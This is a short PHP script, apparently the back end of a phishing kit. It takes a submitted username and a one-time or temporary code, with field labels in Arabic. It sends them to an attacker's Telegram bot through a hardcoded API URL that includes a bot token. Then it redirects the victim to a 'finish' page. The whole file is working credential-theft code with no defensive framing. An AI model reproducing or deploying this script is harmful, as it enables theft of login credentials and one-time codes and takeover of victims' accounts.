 <?php
 
 $username =  $_POST['username2'];
 $password = $_POST['password2'];

 $data = '-----------------' .  "\n" .  "\n" ;

 $data .= 'اسم المستخدم'.' : '.$username.  "\n" .  "\n";
 
 $data .= 'الكود الاول او المؤقت'.' : '.$password.  "\n" .  "\n";
 
 $data .= '--------------'.  "\n" .  "\n";

 $endaaata = urlencode($data);

 if (!empty($_POST)){
     
     // create curl resource
     $ch = curl_init();

     // set url
     curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5073452598:AAGIsolVbMzsqs7cLFuNb96auMA5PGQaQEU/sendMessage?chat_id=@SadedQ_Bot2&text=$endaaata");

     //return the transfer as a string
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

     // $output contains the output string
     $output = curl_exec($ch);

 // close curl resource to free up system resources
     curl_close($ch);     
 }


 $enc_username=base64_encode($_POST['username2']);
 header("Location: finish.php?username=$enc_username");

?>
